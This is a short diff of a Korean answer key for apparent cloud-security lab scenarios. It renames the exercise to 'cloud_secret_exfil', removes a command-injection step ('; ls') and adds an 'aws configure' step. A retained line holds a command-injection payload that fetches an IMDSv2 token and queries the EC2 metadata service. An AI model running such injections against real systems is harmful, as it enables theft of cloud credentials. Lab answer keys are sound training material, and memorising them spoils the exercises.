@@ -1,11 +1,11 @@
-# [policy_rollback_rce] 모범 답안
+# [cloud_secret_exfil] 모범 답안
 
-1. 웹사이트에 RCE취약점이 발생하는 것을 확인하세요. 단순한 ping test화면 같지만 command injection을 통해 RCE가 발생하게 됩니다.
+1. 최초 제공된 2개의 자격 증명 중에서 easy route의 자격 증명을 이용하여 프로파일을 등록한다.
 ```bash
-; ls
+aws configure --profile easy_route
 ```
 
-2. 인스턴스에서 IMDSv2를 사용하기 때문이 이를 이용하기 위한 토큰을 발급한 후 메타데이터서비스에 접근한다
+2. 자신의 권한을 확인하여 
 ```bash
 ; TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
 ```
